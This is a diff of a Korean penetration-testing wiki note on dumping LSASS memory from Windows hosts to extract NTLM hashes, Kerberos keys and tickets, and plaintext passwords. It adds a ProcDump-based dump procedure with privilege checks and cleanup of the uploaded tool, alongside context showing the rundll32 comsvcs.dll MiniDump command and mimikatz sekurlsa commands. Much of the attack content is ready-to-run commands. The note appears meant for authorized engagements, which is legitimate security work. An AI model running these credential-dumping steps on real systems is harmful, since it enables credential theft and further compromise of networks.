@@ -3,7 +3,7 @@ tags:
   - 환경/windows
 시작조건: ["대상 Windows 호스트의 관리자급 또는 SYSTEM 세션 확보", "명령 실행 세션에서 LSASS 프로세스 접근 가능"]
 필요권한: ["상승된 로컬 관리자 토큰, SeDebugPrivilege 또는 SYSTEM 중 선택한 덤프 방식에 필요한 권한"]
-필요조건: ["대상 호스트의 LSASS PID", "덤프 파일을 저장·회수할 경로 또는 직접 조회를 허용하는 실행 환경"]
+필요조건: ["대상 호스트의 LSASS PID", "덤프 파일을 저장·회수할 경로 또는 직접 조회를 허용하는 실행 환경", "선택 시 대상 arch에 맞는 Sysinternals ProcDump"]
 결과: ["NTLM hash", "Kerberos key·ticket", "DPAPI key 또는 master key", "존재할 때만 평문 비밀번호"]
 ---
 
@@ -52,6 +52,26 @@ rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> <LSASS_DUMP_PATH> full
 - `lsass.dmp` 파일 생성.
 - 파일 생성은 메모리 수집 성공일 뿐 credential 추출 성공은 아니다. 생성한 경로와 파일 크기를 확인한 뒤 오프라인 분석으로 넘긴다.
 
+#### SeDebugPrivilege와 ProcDump를 사용하는 대안
+
+`whoami /priv`에 `SeDebugPrivilege`가 존재하고 대상 arch에 맞는 Microsoft Sysinternals ProcDump를 실행할 수 있을 때 사용한다. `Disabled`는 현재 token에 privilege가 존재한다는 뜻일 뿐 활성화·LSASS 접근 성공을 뜻하지 않는다. 관리자 그룹 이름, 현재 token과 privilege의 관계는 [[Windows 액세스 토큰과 특권 활성화]]를 따른다. 먼저 `<PROCDUMP_PATH>`의 작업 전 존재 여부를 기록한다. 기존 파일을 사용한다면 서명·SHA-256과 version을 확인하고 삭제 대상으로 표시하지 않는다. 새로 반입한다면 `Test-Path`가 `False`인 고유 경로를 선택하고 [[상황별 파일 전송]]으로 반입한다.
+
+```powershell
+whoami /priv
+Test-Path -LiteralPath '<PROCDUMP_PATH>'
+```
+
+기존 파일을 검증했거나 새 파일 반입을 마친 뒤 다음을 실행한다.
+
+```powershell
+Get-AuthenticodeSignature -LiteralPath '<PROCDUMP_PATH>'
+Get-FileHash -Algorithm SHA256 -LiteralPath '<PROCDUMP_PATH>'
+& '<PROCDUMP_PATH>' -accepteula -ma <LSASS_PID> '<LSASS_DUMP_PATH>'
+Get-Item -LiteralPath '<LSASS_DUMP_PATH>' | Select-Object FullName,Length,LastWriteTime
+```
+
+ProcDump v12.01 문법에서 `-ma`는 full dump, 대상은 process 이름 또는 PID, 마지막 인자는 dump 파일이나 디렉터리다. `Dump 1 complete`와 exact dump 파일의 생성·크기를 확인한다. EULA를 사전에 승인하지 않을 환경이면 `-accepteula`를 제거하고 승인 절차를 따르며, 이 옵션을 사용했다고 LSASS 접근 권한이 생기는 것은 아니다. `Access is denied` 또는 dump 미생성은 privilege 활성화, 실제 상승 token, LSASS PID와 PPL·Credential Guard 같은 보호 상태를 먼저 확인한다.
+
 ### Linux 분석 호스트에서 덤프 분석
 
 #### 오프라인 분석
@@ -94,12 +114,12 @@ sekurlsa::ekeys
 ## 확인할 출력과 권한
 
 - 덤프 파일 생성과 그 안에서 NTLM hash·Kerberos key·ticket·평문 비밀번호 후보를 추출하는 것은 별도 성공 단계다.
-- 로컬 관리자 그룹 멤버십만 보지 말고 실제 상승된 토큰, SYSTEM 또는 활성화된 `SeDebugPrivilege`를 확인한다.
+- 로컬 관리자 그룹 멤버십만 보지 말고 현재 process의 실제 상승 token, SYSTEM 또는 활성화된 `SeDebugPrivilege`를 확인한다.
 - 추출된 도메인 계정의 NTLM hash·Kerberos key·ticket이 허용하는 실제 도메인 권한은 그룹과 서비스 인증을 통해 별도로 검증한다.
 
 ## 변경 영향과 복구
 
-덤프 방식이 새로 만드는 상태는 대상 Windows 호스트의 `<LSASS_DUMP_PATH>`와 회수한 분석 호스트의 `<LOCAL_LSASS_DUMP_PATH>`다. 생성 뒤 전체 경로·크기·수정 시각을 작업 기록에 남기고, hash·ticket·비밀번호 같은 추출값은 Vault에 기록하지 않는다.
+덤프 방식이 새로 만드는 상태는 대상 Windows 호스트의 `<LSASS_DUMP_PATH>`와 회수한 분석 호스트의 `<LOCAL_LSASS_DUMP_PATH>`다. ProcDump를 반입했다면 작업 전 부재를 확인한 `<PROCDUMP_PATH>`도 포함한다. 생성 뒤 전체 경로·크기·수정 시각을 작업 기록에 남기고, hash·ticket·비밀번호 같은 추출값은 Vault에 기록하지 않는다.
 
 회수와 무결성 확인을 마친 뒤 대상 호스트에서 이번에 만든 파일만 제거한다.
 
@@ -109,7 +129,14 @@ Remove-Item -LiteralPath '<LSASS_DUMP_PATH>' -Force
 Test-Path -LiteralPath '<LSASS_DUMP_PATH>'
 ```
 
-마지막 출력이 `False`여야 대상의 임시 dump 정리를 확인한 것이다. 제거가 실패하면 파일을 연 프로세스, 현재 token의 삭제 권한과 방어 제품 격리 상태를 먼저 확인한다. 분석 호스트 사본은 engagement의 증거 보존·민감 자료 폐기 정책에 따라 정확한 `<LOCAL_LSASS_DUMP_PATH>`를 처리하고, 보존 중에는 접근 권한과 저장 위치를 제한한다. 직접 조회 방식은 dump 파일을 만들지 않으므로 이 파일 삭제 절차를 적용하지 않는다.
+ProcDump를 이번 작업에서 반입했고 사전 확인에서 파일이 없었다면 exact 경로만 추가로 제거한다.
+
+```powershell
+Remove-Item -LiteralPath '<PROCDUMP_PATH>' -Force
+Test-Path -LiteralPath '<PROCDUMP_PATH>'
+```
+
+각 마지막 출력이 `False`여야 대상의 임시 dump·도구 정리를 확인한 것이다. 제거가 실패하면 파일을 연 process, 현재 token의 삭제 권한과 방어 제품 격리 상태를 먼저 확인한다. 분석 호스트 사본은 engagement의 증거 보존·민감 자료 폐기 정책에 따라 정확한 `<LOCAL_LSASS_DUMP_PATH>`를 처리하고, 보존 중에는 접근 권한과 저장 위치를 제한한다. 직접 조회 방식은 dump 파일을 만들지 않으므로 이 파일 삭제 절차를 적용하지 않는다. 기존 ProcDump가 있었거나 이번 반입 여부를 확인할 수 없으면 삭제하지 않는다.
 
 ## 후속 공격 연결
 
@@ -128,3 +155,7 @@ Test-Path -LiteralPath '<LSASS_DUMP_PATH>'
 - [[pypykatz]]
 - [[powershell]]
 - [[hashcat]]
+
+## 참고 링크
+
+- [Microsoft Sysinternals: ProcDump](https://learn.microsoft.com/sysinternals/downloads/procdump)
